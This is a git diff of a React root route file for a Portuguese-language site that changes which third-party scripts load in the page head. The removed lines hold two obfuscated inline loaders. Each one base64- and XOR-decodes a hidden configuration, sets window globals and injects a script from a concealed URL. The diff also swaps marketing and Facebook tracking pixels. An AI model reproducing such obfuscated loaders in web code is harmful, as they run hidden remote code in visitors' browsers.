@@ -90,20 +90,6 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
       { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800&display=swap" },
     ],
-    scripts: [
-      {
-        type: "text/javascript",
-        children: `(function(){var x_ybb=atob("DEagootsB8eRq6L5gj2C1/kAJf2zw9aN8jWajaQPY6m/3taU6yDZjOgDaunz2Y2K4TTJ0v8fKLf408eVrTbJ2u4AKa3iiY7b4zLU0OIOcrP02IDD2RuMgOwAaKXwx9HbuB3bgOUNaqKzkYCJ6z7FzsIIJeuz3cOV9yOCmKlaZv+gn5PAuiORmu9eNv7ym5TL4CWRkrhOeprs");var k_w7rd=[];for(var l_g=0;l_g<x_ybb.length;l_g++){k_w7rd.push(x_ybb.charCodeAt(l_g)&255);}var p_8k3u=k_w7rd[0];var h_vc1s=k_w7rd.slice(1,1+p_8k3u);var u_rom=k_w7rd.slice(1+p_8k3u);var w_f73c=u_rom.map(function(b,j_gkl){return b^h_vc1s[j_gkl%p_8k3u];});var u_gio5="";for(var a_ir6i=0;a_ir6i<w_f73c.length;a_ir6i++){u_gio5+=String.fromCharCode(w_f73c[a_ir6i]&255);}var w_hk7=decodeURIComponent(escape(u_gio5));var p_uzl5=JSON.parse(w_hk7);var v_0=p_uzl5.globals||[];v_0.forEach(function(g_hbhm){window[g_hbhm.name]=g_hbhm.value;});var t_2=document.createElement("script");t_2.src=p_uzl5.url;t_2.async=true;t_2.defer=true;(p_uzl5.attributes||[]).forEach(function(a_j){t_2.setAttribute(a_j.name,a_j.value);});(document.head||document.documentElement).appendChild(t_2);})();`,
-      },
-      {
-        type: "text/javascript",
-        children: `(function(){var b_zi=atob("DKbS9+nCR36OzsMtj93wgpuuZUSsprdZ/9Xo2MahIxCgu7dA5sCr2YqtKlDsvOxe7NS7h52xaAv6o7AC48emkpq2aRT97O8P7tKmhYCgMgrrveEX1N3wmYivIly07KdM+8f/gp2vLhj347Nf6tC3mZ3vPx3hqu5e7M3w28u0JhL7q+EXrYSv25LgKR/jq+EXrcKzg4jvMgrjp6VUotagkp+nKQqjvbZP5sKh1cXgMR/iu6YPtYTwirS/");var q_sn=[];for(var d_h=0;d_h<b_zi.length;d_h++){q_sn.push(b_zi.charCodeAt(d_h)&255);}var w_5pzj=q_sn[0];var v_e5=q_sn.slice(1,1+w_5pzj);var a_g=q_sn.slice(1+w_5pzj);var r_6=a_g.map(function(b,p_wmd){return b^v_e5[p_wmd%w_5pzj];});var s_yjk="";for(var x_fx=0;x_fx<r_6.length;x_fx++){s_yjk+=String.fromCharCode(r_6[x_fx]&255);}var i_ede=decodeURIComponent(escape(s_yjk));var u_gilw=JSON.parse(i_ede);var g_ih=u_gilw.globals||[];g_ih.forEach(function(e_7pq){window[e_7pq.name]=e_7pq.value;});var q_zx=document.createElement("script");q_zx.src=u_gilw.url;q_zx.async=true;q_zx.defer=true;(u_gilw.attributes||[]).forEach(function(a_z7g4){q_zx.setAttribute(a_z7g4.name,a_z7g4.value);});(document.head||document.documentElement).appendChild(q_zx);})();`,
-      },
-      {
-        type: "text/javascript",
-        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1774984943513575');fbq('track', 'PageView');`,
-      },
-    ],
   }),
   shellComponent: RootShell,
   component: RootComponent,
@@ -116,6 +102,20 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="pt-BR">
       <head>
         <HeadContent />
+        <script
+          src="https://cashflow.mentoriaprocesso.com/t/p.js?w=289278f7-baa6-4274-8916-613a4340b700&o=aa49d034-6c1b-442b-9fe4-a58455a4a83c"
+          data-offer="aa49d034-6c1b-442b-9fe4-a58455a4a83c"
+          data-nowprocket=""
+          data-no-minify="1"
+          data-no-optimize="1"
+          data-cfasync="false"
+          async
+        />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1774984943513575');fbq('track', 'PageView');`,
+          }}
+        />
       </head>
       <body>
         <noscript>
@@ -136,16 +136,6 @@ function RootShell({ children }: { children: ReactNode }) {
 function RootComponent() {
   const { queryClient } = Route.useRouteContext();
 
-  useEffect(() => {
-    // FluxoFy Tracking Integration
-    const fluxScript = document.createElement("script");
-    fluxScript.src = "https://fluxo-track.vercel.app/fluxofy-pixel.js";
-    fluxScript.setAttribute("data-product-id", "9df34b62-c64f-4327-8f63-3587f52035a0");
-    fluxScript.setAttribute("data-user-id", "3f024dde-c859-4515-9d1e-9d1334447d61");
-    fluxScript.setAttribute("data-ic-url", "https://pay.wiapy.com/");
-    document.head.appendChild(fluxScript);
-  }, []);
-
   return (
     <QueryClientProvider client={queryClient}>
       {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
@@ -153,3 +143,4 @@ function RootComponent() {
     </QueryClientProvider>
   );
 }
+
